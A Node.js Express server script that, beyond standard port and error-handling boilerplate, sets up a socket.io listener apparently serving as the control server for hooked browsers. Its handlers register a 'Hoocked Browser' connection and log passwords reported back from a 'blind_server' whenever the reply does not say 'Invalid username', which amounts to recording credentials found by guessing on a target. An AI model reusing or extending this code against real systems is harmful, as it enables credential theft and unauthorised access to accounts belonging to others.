#!/usr/bin/env node

/**
 * Module dependencies.
 */

var app = require('../app');
var debug = require('debug')('sockets:server');
var http = require('http');


/**
 * Get port from environment and store in Express.
 */

var port = normalizePort(process.env.PORT || '3000');
app.set('port', port);

/**
 * Create HTTP server.
 */

var server = http.createServer(app);

/**
 * Listen on provided port, on all network interfaces.
 */

server.listen(port);
server.on('error', onError);
server.on('listening', onListening);


const io = require('socket.io');
// create a WebSocket listener for the same server
realtimeListener = io.listen(server);

// the socket can be a phone or a desktop
realtimeListener.on('connection', function (socket) {

  // receives a connect message from a desktop (for this example, we will only have one)
  socket.on("desktop-connect", function () {
    console.log("Desktop Connected");
  });

  // receives a connect message from a phone
  socket.on("browser-connect", function () {
    app.setSocket(socket);
    console.log("Hoocked Browser Connected");
  });

  // receives a connect message from a phone
  socket.on("answer", function (data) {
    if (data.data.search("Invalid username")==-1){
      console.log("Answer from blind_server:" + data.passwd);
      // console.log("Answer from blind_server:" + data.data);
    }
  });
});


/**
 * Normalize a port into a number, string, or false.
 */

function normalizePort(val) {
  var port = parseInt(val, 10);

  if (isNaN(port)) {
    // named pipe
    return val;
  }

  if (port >= 0) {
    // port number
    return port;
  }

  return false;
}

/**
 * Event listener for HTTP server "error" event.
 */

function onError(error) {
  if (error.syscall !== 'listen') {
    throw error;
  }

  var bind = typeof port === 'string'
      ? 'Pipe ' + port
      : 'Port ' + port;

  // handle specific listen errors with friendly messages
  switch (error.code) {
    case 'EACCES':
      console.error(bind + ' requires elevated privileges');
      process.exit(1);
      break;
    case 'EADDRINUSE':
      console.error(bind + ' is already in use');
      process.exit(1);
      break;
    default:
      throw error;
  }
}

/**
 * Event listener for HTTP server "listening" event.
 */

function onListening() {
  var addr = server.address();
  var bind = typeof addr === 'string'
      ? 'pipe ' + addr
      : 'port ' + addr.port;
  debug('Listening on ' + bind);
}
